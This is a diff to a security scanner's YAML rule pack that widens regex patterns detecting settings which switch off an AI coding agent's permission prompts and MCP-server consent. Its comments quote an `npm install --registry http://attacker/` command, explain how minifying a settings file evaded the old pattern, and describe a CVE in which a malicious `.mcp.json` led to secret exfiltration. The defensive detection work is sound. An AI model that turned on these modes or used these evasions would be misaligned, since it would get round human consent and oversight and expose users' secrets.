@@ -1,6 +1,6 @@
 apiVersion: skillguard.net/rulepack.v1
 name: core-metadata
-version: 1.0.0
+version: 1.1.0
 description: Manifest integrity and over-privilege (rule-verification.md §4).
 rules:
   - id: SG-MTA-001
@@ -92,14 +92,46 @@ rules:
         # exactly this file and then has the sub-agent run
         # `npm install --registry http://attacker/`, after which the agent has no
         # visibility of what executed.
-        - regex: '(?im)^\s*["'']?permission_?[Mm]ode["'']?\s*[:=]\s*["'']?(bypassPermissions|bypass)\b'
+        #
+        # NOT anchored with `^\s*`, unlike the allowed-tools leaf above. The
+        # anchor made every one of these evadable by MINIFYING the settings
+        # file: verified on main, `{\n  "permissionMode": "bypassPermissions"\n}`
+        # fires while `{"permissionMode":"bypassPermissions"}` — the same
+        # setting, one line — scans completely clean, because the key is
+        # preceded by `{` rather than whitespace. A key/value pair is the real
+        # unit here, so the key boundary is what the pattern should bind to.
+        # `allowed-tools` keeps its anchor: it is YAML front-matter, where the
+        # key genuinely does start a line.
+        #
+        # `defaultMode` is the same setting under its other name: Claude Code
+        # accepts the mode at `permissions.defaultMode` in settings.json as well
+        # as `permissionMode` in a sub-agent's front-matter, and the rule knew
+        # only the second spelling. Bound to the dangerous VALUES, never the bare
+        # key — a bare `defaultMode` is ordinary application config (the corpus
+        # has one, an approval-gate UI's own TypeScript).
+        - regex: '(?i)\b(?:permission_?[Mm]ode|defaultMode)\b["'']?\s*[:=]\s*["'']?(?:bypassPermissions\b|bypass\b)'
           confidence: 0.9
         # `acceptEdits` auto-approves file *writes* only — a narrower escape than
         # bypassPermissions, so it is reported at a lower confidence rather than
         # treated as equivalent. It still removes a prompt the user would
         # otherwise see for every edit.
-        - regex: '(?im)^\s*["'']?permission_?[Mm]ode["'']?\s*[:=]\s*["'']?acceptEdits\b'
+        - regex: '(?i)\b(?:permission_?[Mm]ode|defaultMode)\b["'']?\s*[:=]\s*["'']?acceptEdits\b'
           confidence: 0.75
+        # Standing consent for EVERY project-declared MCP server, with no
+        # per-server prompt. This is the consent-gate half of CVE-2026-47751 /
+        # GHSA-8q5r-mmjf-575q: the Claude Code Action checked out an attacker's
+        # PR head, read `.mcp.json` from the working directory, and had all
+        # project MCP servers unconditionally enabled — so a `.mcp.json` in a
+        # pull request reached code execution on the runner and exfiltrated the
+        # workflow's secrets, with no approval step anywhere in the chain. A
+        # skill shipping the same key grants that on a developer's machine.
+        # Both key names are 0 of 12,104 corpus files and are literal Claude
+        # Code setting names, so the leaves are unambiguous.
+        - regex: '(?i)\benableAllProjectMcpServers\b["'']?\s*[:=]\s*["'']?true\b'
+          confidence: 0.9
+        # The wildcard spelling of the same grant.
+        - regex: '(?i)\benabledMcpjsonServers\b["'']?\s*[:=]\s*\[\s*["'']\*["'']'
+          confidence: 0.85
     rationale: >-
       Wildcard tool grants disable least-privilege boundaries, and a bundled sub-agent that declares
       `permissionMode: bypassPermissions` goes further — it removes the consent prompt entirely, so the
